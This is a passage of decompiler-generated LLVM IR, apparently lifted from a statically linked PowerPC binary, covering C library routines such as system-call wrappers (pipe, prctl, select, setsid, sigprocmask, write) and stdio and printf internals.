  %v2_1000db28 = call i32 @__libc_open(i32 577, i32 577)
  ret i32 %v2_1000db28
}

define i32 @__GI_pipe(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000db44 = call i32 @__asm_mfcr()
  %v1_1000db48 = and i32 %v0_1000db44, 268435456
  %v3_1000db48 = icmp eq i32 %v1_1000db48, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_1000db44, i32* %r31.global-to-local, align 4
  br i1 %v3_1000db48, label %dec_label_pc_1000db60, label %dec_label_pc_1000db54

dec_label_pc_1000db54:                            ; preds = %entry
  %v0_1000db54 = call i32 @__errno_location()
  %v0_1000db58 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000db58 = inttoptr i32 %v0_1000db54 to i32*
  store i32 %v0_1000db58, i32* %v2_1000db58, align 4
  br label %dec_label_pc_1000db60

dec_label_pc_1000db60:                            ; preds = %entry, %dec_label_pc_1000db54
  %v0_1000db70 = phi i32 [ %v0_1000db44, %entry ], [ -1, %dec_label_pc_1000db54 ]
  ret i32 %v0_1000db70

; uselistorder directives
  uselistorder label %dec_label_pc_1000db60, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000db8c = call i32 @__asm_mfcr()
  %v1_1000db90 = and i32 %v0_1000db8c, 268435456
  %v3_1000db90 = icmp eq i32 %v1_1000db90, 0
  store i32 %v0_1000db8c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000db90, label %dec_label_pc_1000dba8, label %dec_label_pc_1000db9c

dec_label_pc_1000db9c:                            ; preds = %entry
  %v0_1000db9c = call i32 @__errno_location()
  %v0_1000dba0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dba0 = inttoptr i32 %v0_1000db9c to i32*
  store i32 %v0_1000dba0, i32* %v2_1000dba0, align 4
  br label %dec_label_pc_1000dba8

dec_label_pc_1000dba8:                            ; preds = %entry, %dec_label_pc_1000db9c
  %v0_1000dbb8 = phi i32 [ %v0_1000db8c, %entry ], [ -1, %dec_label_pc_1000db9c ]
  ret i32 %v0_1000dbb8

; uselistorder directives
  uselistorder label %dec_label_pc_1000dba8, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000dbd4 = call i32 @__asm_mfcr()
  %v1_1000dbd8 = and i32 %v0_1000dbd4, 268435456
  %v3_1000dbd8 = icmp eq i32 %v1_1000dbd8, 0
  store i32 %v0_1000dbd4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dbd8, label %dec_label_pc_1000dbf0, label %dec_label_pc_1000dbe4

dec_label_pc_1000dbe4:                            ; preds = %entry
  %v0_1000dbe4 = call i32 @__errno_location()
  %v0_1000dbe8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dbe8 = inttoptr i32 %v0_1000dbe4 to i32*
  store i32 %v0_1000dbe8, i32* %v2_1000dbe8, align 4
  br label %dec_label_pc_1000dbf0

dec_label_pc_1000dbf0:                            ; preds = %entry, %dec_label_pc_1000dbe4
  %v0_1000dc00 = phi i32 [ %v0_1000dbd4, %entry ], [ -1, %dec_label_pc_1000dbe4 ]
  ret i32 %v0_1000dc00

; uselistorder directives
  uselistorder label %dec_label_pc_1000dbf0, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000dc1c = call i32 @__asm_mfcr()
  %v1_1000dc20 = and i32 %v0_1000dc1c, 268435456
  %v3_1000dc20 = icmp eq i32 %v1_1000dc20, 0
  store i32 %v0_1000dc1c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dc20, label %dec_label_pc_1000dc38, label %dec_label_pc_1000dc2c

dec_label_pc_1000dc2c:                            ; preds = %entry
  %v0_1000dc2c = call i32 @__errno_location()
  %v0_1000dc30 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dc30 = inttoptr i32 %v0_1000dc2c to i32*
  store i32 %v0_1000dc30, i32* %v2_1000dc30, align 4
  br label %dec_label_pc_1000dc38

dec_label_pc_1000dc38:                            ; preds = %entry, %dec_label_pc_1000dc2c
  %v0_1000dc48 = phi i32 [ %v0_1000dc1c, %entry ], [ -1, %dec_label_pc_1000dc2c ]
  ret i32 %v0_1000dc48

; uselistorder directives
  uselistorder label %dec_label_pc_1000dc38, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000dc64 = call i32 @__asm_mfcr()
  %v1_1000dc68 = and i32 %v0_1000dc64, 268435456
  %v3_1000dc68 = icmp eq i32 %v1_1000dc68, 0
  store i32 %v0_1000dc64, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dc68, label %dec_label_pc_1000dc80, label %dec_label_pc_1000dc74

dec_label_pc_1000dc74:                            ; preds = %entry
  %v0_1000dc74 = call i32 @__errno_location()
  %v0_1000dc78 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dc78 = inttoptr i32 %v0_1000dc74 to i32*
  store i32 %v0_1000dc78, i32* %v2_1000dc78, align 4
  br label %dec_label_pc_1000dc80

dec_label_pc_1000dc80:                            ; preds = %entry, %dec_label_pc_1000dc74
  %v0_1000dc90 = phi i32 [ %v0_1000dc64, %entry ], [ -1, %dec_label_pc_1000dc74 ]
  ret i32 %v0_1000dc90

; uselistorder directives
  uselistorder label %dec_label_pc_1000dc80, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_1000dc94 = icmp eq i32 %arg2, 0
  br i1 %v3_1000dc94, label %dec_label_pc_1000dcd4, label %dec_label_pc_1000dcbc

dec_label_pc_1000dcbc:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_1000dcd4, label %dec_label_pc_1000dcc4

dec_label_pc_1000dcc4:                            ; preds = %dec_label_pc_1000dcbc
  %v0_1000dcc4 = call i32 @__errno_location()
  %v2_1000dccc = inttoptr i32 %v0_1000dcc4 to i32*
  store i32 22, i32* %v2_1000dccc, align 4
  %v0_1000dcf8.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000dcf4

dec_label_pc_1000dcd4:                            ; preds = %dec_label_pc_1000dcbc, %entry
  %v0_1000dcd8 = call i32 @__asm_mfcr()
  %v1_1000dcdc = and i32 %v0_1000dcd8, 268435456
  %v3_1000dcdc = icmp eq i32 %v1_1000dcdc, 0
  store i32 %v0_1000dcd8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dcdc, label %dec_label_pc_1000dcf4, label %dec_label_pc_1000dce8

dec_label_pc_1000dce8:                            ; preds = %dec_label_pc_1000dcd4
  %v0_1000dce8 = call i32 @__errno_location()
  %v0_1000dcec = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dcec = inttoptr i32 %v0_1000dce8 to i32*
  store i32 %v0_1000dcec, i32* %v2_1000dcec, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000dcf4

dec_label_pc_1000dcf4:                            ; preds = %dec_label_pc_1000dcd4, %dec_label_pc_1000dcc4, %dec_label_pc_1000dce8
  %v0_1000dcf8 = phi i32 [ %v0_1000dcd8, %dec_label_pc_1000dcd4 ], [ %v0_1000dcf8.pre, %dec_label_pc_1000dcc4 ], [ -1, %dec_label_pc_1000dce8 ]
  ret i32 %v0_1000dcf8

; uselistorder directives
  uselistorder label %dec_label_pc_1000dcf4, { 2, 0, 1 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000dd24 = call i32 @__asm_mfcr()
  %v1_1000dd28 = and i32 %v0_1000dd24, 268435456
  %v3_1000dd28 = icmp eq i32 %v1_1000dd28, 0
  store i32 %v0_1000dd24, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dd28, label %dec_label_pc_1000dd40, label %dec_label_pc_1000dd34

dec_label_pc_1000dd34:                            ; preds = %entry
  %v0_1000dd34 = call i32 @__errno_location()
  %v0_1000dd38 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dd38 = inttoptr i32 %v0_1000dd34 to i32*
  store i32 %v0_1000dd38, i32* %v2_1000dd38, align 4
  br label %dec_label_pc_1000dd40

dec_label_pc_1000dd40:                            ; preds = %entry, %dec_label_pc_1000dd34
  %v0_1000dd50 = phi i32 [ %v0_1000dd24, %entry ], [ -1, %dec_label_pc_1000dd34 ]
  ret i32 %v0_1000dd50

; uselistorder directives
  uselistorder label %dec_label_pc_1000dd40, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_1000dd58 = call i32 @wait4(i32 0)
  ret i32 %v1_1000dd58
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000dd74 = call i32 @__asm_mfcr()
  %v1_1000dd78 = and i32 %v0_1000dd74, 268435456
  %v3_1000dd78 = icmp eq i32 %v1_1000dd78, 0
  store i32 %v0_1000dd74, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dd78, label %dec_label_pc_1000dd90, label %dec_label_pc_1000dd84

dec_label_pc_1000dd84:                            ; preds = %entry
  %v0_1000dd84 = call i32 @__errno_location()
  %v0_1000dd88 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dd88 = inttoptr i32 %v0_1000dd84 to i32*
  store i32 %v0_1000dd88, i32* %v2_1000dd88, align 4
  br label %dec_label_pc_1000dd90

dec_label_pc_1000dd90:                            ; preds = %entry, %dec_label_pc_1000dd84
  %v0_1000dda0 = phi i32 [ %v0_1000dd74, %entry ], [ -1, %dec_label_pc_1000dd84 ]
  ret i32 %v0_1000dda0

; uselistorder directives
  uselistorder label %dec_label_pc_1000dd90, { 1, 0 }
}

define i32 @isspace(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000dda8 = mul i32 %arg1, 2
  %v3_1000ddac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -14168) to i32*), align 4
  %v2_1000ddb0 = add i32 %v3_1000ddac, %v1_1000dda8
  %v3_1000ddb0 = inttoptr i32 %v2_1000ddb0 to i16*
  %v4_1000ddb0 = load i16, i16* %v3_1000ddb0, align 2
  %v5_1000ddb0 = zext i16 %v4_1000ddb0 to i32
  %v1_1000ddb4 = call i32 @__asm_rlwinm(i32 %v5_1000ddb0, i32 0, i32 26, i32 26)
  ret i32 %v1_1000ddb4
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000ddbc = add i32 %arg1, 128
  %v1_1000ddc0 = mul i32 %arg1, 2
  %v2_1000ddc4 = icmp ugt i32 %v1_1000ddbc, 383
  %v0_1000ddc8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000ddc4, i32 %v0_1000ddc8)
  %v3_1000ddd0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -14160) to i32*), align 4
  %v2_1000ddd4 = add i32 %v1_1000ddc0, %v3_1000ddd0
  %v3_1000ddd4 = inttoptr i32 %v2_1000ddd4 to i16*
  %v4_1000ddd4 = load i16, i16* %v3_1000ddd4, align 2
  %v5_1000ddd4 = sext i16 %v4_1000ddd4 to i32
  ret i32 %v5_1000ddd4
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1002c940.1035 to i32)
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v2_1000de88 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000de88, i32* @r6, align 4
  store i32 3, i32* %stack_var_-104, align 4
  %v2_1000dedc = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000dedc, i32* %stack_var_-96, align 4
  store i32 268492520, i32* @lr, align 4
  %v0_1000dee4 = call i32 @__GI_vsnprintf()
  ret i32 %v0_1000dee4
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_1000df18 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000df18, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_1000df68 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000df68, i32* %stack_var_-96, align 4
  store i32 268492660, i32* @lr, align 4
  %v0_1000df70 = call i32 @__GI_vsnprintf()
  ret i32 %v0_1000df70
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000df90 = load i32, i32* @r4, align 4
  store i32 %v0_1000df90, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_1000dfac = load i32, i32* @r3, align 4
  %v1_1000dfac = sub i32 -1, %v0_1000dfac
  store i32 %v1_1000dfac, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_1000dfac, i32* %r31.global-to-local, align 4
  %v2_1000dfc0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000dfc0, i32* @r3, align 4
  %v0_1000dfc4 = load i32, i32* @r5, align 4
  store i32 %v0_1000dfc4, i32* %r29.global-to-local, align 4
  %v0_1000dfc8 = load i32, i32* @r6, align 4
  store i32 %v0_1000dfc8, i32* @r28, align 4
  store i32 268492760, i32* @lr, align 4
  %v0_1000dfd4 = call i32 @__stdio_init_mutex()
  %v0_1000dfd8 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000dfd8 = load i32, i32* @r27, align 4
  %v3_1000dfd8 = icmp ugt i32 %v0_1000dfd8, %v1_1000dfd8
  %v0_1000dfdc = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000dfdc, i32* @r4, align 4
  %v0_1000dfe0 = load i32, i32* @r28, align 4
  store i32 %v0_1000dfe0, i32* @r5, align 4
  %v2_1000dfe4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000dfe4, i32* @r3, align 4
  br i1 %v3_1000dfd8, label %dec_label_pc_1000dff0, label %dec_label_pc_1000dff4

dec_label_pc_1000dff0:                            ; preds = %entry
  store i32 %v1_1000dfd8, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000dff4

dec_label_pc_1000dff4:                            ; preds = %entry, %dec_label_pc_1000dff0
  %v1_1000dff4 = phi i32 [ %v0_1000dfd8, %entry ], [ %v1_1000dfd8, %dec_label_pc_1000dff0 ]
  %v0_1000dff4 = load i32, i32* %r31.global-to-local, align 4
  store i32 268492820, i32* @lr, align 4
  %v0_1000e010 = call i32 @_vfprintf_internal()
  %v0_1000e014 = load i32, i32* @r30, align 4
  %v3_1000e014 = icmp eq i32 %v0_1000e014, 0
  br i1 %v3_1000e014, label %dec_label_pc_1000e03c, label %dec_label_pc_1000e01c

dec_label_pc_1000e01c:                            ; preds = %dec_label_pc_1000dff4
  %v4_1000e028 = icmp eq i32 %v1_1000dff4, 0
  %v1_1000e024 = sext i1 %v4_1000e028 to i32
  %v0_1000e030.v0_1000dff4 = add i32 %v0_1000dff4, %v1_1000e024
  %stack_var_-88.0 = inttoptr i32 %v0_1000e030.v0_1000dff4 to i8*
  %v0_1000e038 = load i32, i32* @r26, align 4
  %v1_1000e038 = trunc i32 %v0_1000e038 to i8
  store i8 %v1_1000e038, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_1000e03c

dec_label_pc_1000e03c:                            ; preds = %dec_label_pc_1000dff4, %dec_label_pc_1000e01c
  ret i32 %v0_1000e010

; uselistorder directives
  uselistorder i32 %v0_1000dfac, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_1000e03c, { 1, 0 }
  uselistorder label %dec_label_pc_1000dff4, { 1, 0 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* @r28, align 4
  %v0_1000e064 = call i32 @__errno_location()
  store i32 %v0_1000e064, i32* @r26, align 4
  %v1_1000e070 = inttoptr i32 %v0_1000e064 to i32*
  %v2_1000e070 = load i32, i32* %v1_1000e070, align 4
  store i32 %v2_1000e070, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_1002c598.1032 to i32), i32* @r27, align 4
  %v3_1000e078 = load i16, i16* @global_var_1002c598.1032, align 2
  %v4_1000e078 = zext i16 %v3_1000e078 to i32
  store i32 %v4_1000e078, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000e080.1036 to i32), i32* @lr, align 4
  %v1_1000e07c = call i32 @isatty(i32 0)
  %v1_1000e080 = sub i32 1, %v1_1000e07c
  %v1_1000e084 = mul i32 %v1_1000e080, 256
  %v0_1000e088 = load i32, i32* @r29, align 4
  %v2_1000e088 = xor i32 %v1_1000e084, %v0_1000e088
  %v1_1000e090 = trunc i32 %v2_1000e088 to i16
  store i16 %v1_1000e090, i16* @global_var_1002c598.1032, align 2
  %v3_1000e094 = load i16, i16* @global_var_1002c5e8.1033, align 2
  %v4_1000e094 = zext i16 %v3_1000e094 to i32
  store i32 %v4_1000e094, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000e09c.1037 to i32), i32* @lr, align 4
  %v1_1000e098 = call i32 @isatty(i32 1)
  %v1_1000e09c = sub i32 1, %v1_1000e098
  %v1_1000e0a0 = mul i32 %v1_1000e09c, 256
  %v0_1000e0a4 = load i32, i32* @r29, align 4
  %v2_1000e0a4 = xor i32 %v1_1000e0a0, %v0_1000e0a4
  %v1_1000e0a8 = trunc i32 %v2_1000e0a4 to i16
  store i16 %v1_1000e0a8, i16* @global_var_1002c5e8.1033, align 2
  %v0_1000e0ac = load i32, i32* @r25, align 4
  %v1_1000e0ac = load i32, i32* @r26, align 4
  %v2_1000e0ac = inttoptr i32 %v1_1000e0ac to i32*
  store i32 %v0_1000e0ac, i32* %v2_1000e0ac, align 4
  ret i32 %v1_1000e0a0

; uselistorder directives
  uselistorder i32 %v1_1000e0a0, { 1, 0 }
  uselistorder i16* @global_var_1002c5e8.1033, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1001b26c.1038 to i32), i32* @r4, align 4
  %v0_1000e0d0 = call i32 @memcpy()
  ret i32 %v0_1000e0d0
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002c568.1039 to i32), i32* @r3, align 4
  store i32 268493040, i32* @lr, align 4
  %v0_1000e0ec = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_1002c580.1040 to i32), i32* @r3, align 4
  store i32 268493052, i32* @lr, align 4
  %v0_1000e0f8 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_1002c8c8.1041 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_1000e1449 = icmp eq i32 %storemerge6, 0
  %v1_1000e14811 = add i32 %storemerge6, 56
  store i32 %v1_1000e14811, i32* %r30.global-to-local, align 4
  br i1 %v3_1000e1449, label %dec_label_pc_1000e154, label %dec_label_pc_1000e108

dec_label_pc_1000e108:                            ; preds = %entry, %dec_label_pc_1000e134
  %v0_1000e108 = call i32 @__pthread_return_0()
  %v3_1000e10c = icmp eq i32 %v0_1000e108, 0
  %v0_1000e110 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000e110, i32* @r3, align 4
  br i1 %v3_1000e10c, label %dec_label_pc_1000e134, label %dec_label_pc_1000e118

dec_label_pc_1000e118:                            ; preds = %dec_label_pc_1000e108
  %v0_1000e118 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000e118 = add i32 %v0_1000e118, 8
  %v2_1000e118 = inttoptr i32 %v1_1000e118 to i32*
  %v3_1000e118 = load i32, i32* %v2_1000e118, align 4
  store i32 %v3_1000e118, i32* %r9.global-to-local, align 4
  %v3_1000e120 = inttoptr i32 %v0_1000e118 to i16*
  store i16 48, i16* %v3_1000e120, align 2
  %v0_1000e124 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e124 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e124 = add i32 %v1_1000e124, 20
  %v3_1000e124 = inttoptr i32 %v2_1000e124 to i32*
  store i32 %v0_1000e124, i32* %v3_1000e124, align 4
  %v0_1000e128 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e128 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e128 = add i32 %v1_1000e128, 24
  %v3_1000e128 = inttoptr i32 %v2_1000e128 to i32*
  store i32 %v0_1000e128, i32* %v3_1000e128, align 4
  %v0_1000e12c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e12c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e12c = add i32 %v1_1000e12c, 28
  %v3_1000e12c = inttoptr i32 %v2_1000e12c to i32*
  store i32 %v0_1000e12c, i32* %v3_1000e12c, align 4
  %v0_1000e130 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e130 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e130 = add i32 %v1_1000e130, 16
  %v3_1000e130 = inttoptr i32 %v2_1000e130 to i32*
  store i32 %v0_1000e130, i32* %v3_1000e130, align 4
  br label %dec_label_pc_1000e134

dec_label_pc_1000e134:                            ; preds = %dec_label_pc_1000e108, %dec_label_pc_1000e118
  %v1_1000e138 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e138 = add i32 %v1_1000e138, 52
  %v3_1000e138 = inttoptr i32 %v2_1000e138 to i32*
  store i32 1, i32* %v3_1000e138, align 4
  store i32 268493120, i32* @lr, align 4
  %v0_1000e13c = call i32 @__stdio_init_mutex()
  %v0_1000e140 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000e140 = add i32 %v0_1000e140, 32
  %v2_1000e140 = inttoptr i32 %v1_1000e140 to i32*
  %storemerge = load i32, i32* %v2_1000e140, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_1000e144 = icmp eq i32 %storemerge, 0
  %v1_1000e148 = add i32 %storemerge, 56
  store i32 %v1_1000e148, i32* %r30.global-to-local, align 4
  br i1 %v3_1000e144, label %dec_label_pc_1000e144.dec_label_pc_1000e154_crit_edge, label %dec_label_pc_1000e108

dec_label_pc_1000e144.dec_label_pc_1000e154_crit_edge: ; preds = %dec_label_pc_1000e134
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1002c8c8.1041 to i32*), align 4
  br label %dec_label_pc_1000e154

dec_label_pc_1000e154:                            ; preds = %dec_label_pc_1000e144.dec_label_pc_1000e154_crit_edge, %entry
  %v0_1000e19016 = phi i32 [ %v1_1000e148, %dec_label_pc_1000e144.dec_label_pc_1000e154_crit_edge ], [ %v1_1000e14811, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_1000e144.dec_label_pc_1000e154_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_1000e1785 = icmp eq i32 %storemerge12, 0
  br i1 %v3_1000e1785, label %dec_label_pc_1000e180, label %dec_label_pc_1000e160

dec_label_pc_1000e160:                            ; preds = %dec_label_pc_1000e154, %dec_label_pc_1000e174
  %v0_1000e160 = phi i32 [ %storemerge1, %dec_label_pc_1000e174 ], [ %storemerge12, %dec_label_pc_1000e154 ]
  %v1_1000e160 = inttoptr i32 %v0_1000e160 to i16*
  %v2_1000e160 = load i16, i16* %v1_1000e160, align 2
  %v3_1000e160 = zext i16 %v2_1000e160 to i32
  store i32 %v0_1000e160, i32* @r3, align 4
  %v1_1000e168 = and i32 %v3_1000e160, 64
  store i32 %v1_1000e168, i32* %r9.global-to-local, align 4
  %v3_1000e168 = icmp eq i32 %v1_1000e168, 0
  br i1 %v3_1000e168, label %dec_label_pc_1000e174, label %dec_label_pc_1000e170

dec_label_pc_1000e170:                            ; preds = %dec_label_pc_1000e160
  store i32 268493172, i32* @lr, align 4
  %v0_1000e170 = call i32 @__stdio_wcommit()
  %v0_1000e174.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e174

dec_label_pc_1000e174:                            ; preds = %dec_label_pc_1000e160, %dec_label_pc_1000e170
  %v0_1000e174 = phi i32 [ %v0_1000e160, %dec_label_pc_1000e160 ], [ %v0_1000e174.pre, %dec_label_pc_1000e170 ]
  %v0_1000e19017 = phi i32 [ %v0_1000e160, %dec_label_pc_1000e160 ], [ %v0_1000e170, %dec_label_pc_1000e170 ]
  %v1_1000e174 = add i32 %v0_1000e174, 32
  %v2_1000e174 = inttoptr i32 %v1_1000e174 to i32*
  %storemerge1 = load i32, i32* %v2_1000e174, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_1000e178 = icmp eq i32 %storemerge1, 0
  br i1 %v3_1000e178, label %dec_label_pc_1000e180, label %dec_label_pc_1000e160

dec_label_pc_1000e180:                            ; preds = %dec_label_pc_1000e174, %dec_label_pc_1000e154
  %v0_1000e190 = phi i32 [ %v0_1000e19016, %dec_label_pc_1000e154 ], [ %v0_1000e19017, %dec_label_pc_1000e174 ]
  ret i32 %v0_1000e190

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_1000e160, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e174, { 1, 0 }
  uselistorder label %dec_label_pc_1000e160, { 1, 0 }
  uselistorder label %dec_label_pc_1000e134, { 1, 0 }
  uselistorder label %dec_label_pc_1000e108, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_1000e19c = load i32, i32* @r31, align 4
  %v0_1000e1a0 = load i32, i32* @r3, align 4
  %v1_1000e1a8 = add i32 %v0_1000e1a0, 8
  %v2_1000e1a8 = inttoptr i32 %v1_1000e1a8 to i32*
  %v3_1000e1a8 = load i32, i32* %v2_1000e1a8, align 4
  %v1_1000e1ac = add i32 %v0_1000e1a0, 16
  %v2_1000e1ac = inttoptr i32 %v1_1000e1ac to i32*
  %v3_1000e1ac = load i32, i32* %v2_1000e1ac, align 4
  %v2_1000e1b4 = sub i32 %v3_1000e1ac, %v3_1000e1a8
  store i32 %v2_1000e1b4, i32* @r5, align 4
  %v5_1000e1b4 = icmp eq i32 %v2_1000e1b4, 0
  br i1 %v5_1000e1b4, label %dec_label_pc_1000e1c4, label %dec_label_pc_1000e1bc

dec_label_pc_1000e1bc:                            ; preds = %entry
  store i32 %v3_1000e1a8, i32* %v2_1000e1ac, align 4
  store i32 268493252, i32* @lr, align 4
  %v2_1000e1c0 = inttoptr i32 %v3_1000e1a8 to i16*
  %v3_1000e1c0 = call i32 @__stdio_WRITE(i16* %v2_1000e1c0, i32 %v2_1000e1b4)
  %v0_1000e1c4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e1c4

dec_label_pc_1000e1c4:                            ; preds = %entry, %dec_label_pc_1000e1bc
  %v0_1000e1c4 = phi i32 [ %v0_1000e1a0, %entry ], [ %v0_1000e1c4.pre, %dec_label_pc_1000e1bc ]
  %v1_1000e1c4 = add i32 %v0_1000e1c4, 8
  %v2_1000e1c4 = inttoptr i32 %v1_1000e1c4 to i32*
  %v3_1000e1c4 = load i32, i32* %v2_1000e1c4, align 4
  %v1_1000e1c8 = add i32 %v0_1000e1c4, 16
  %v2_1000e1c8 = inttoptr i32 %v1_1000e1c8 to i32*
  %v3_1000e1c8 = load i32, i32* %v2_1000e1c8, align 4
  store i32 %v0_1000e19c, i32* @r31, align 4
  %v2_1000e1d0 = sub i32 %v3_1000e1c8, %v3_1000e1c4
  ret i32 %v2_1000e1d0

; uselistorder directives
  uselistorder i32 %v0_1000e1c4, { 1, 0 }
  uselistorder i32 %v3_1000e1a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e1c4, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000e1f0 = load i32, i32* @r3, align 4
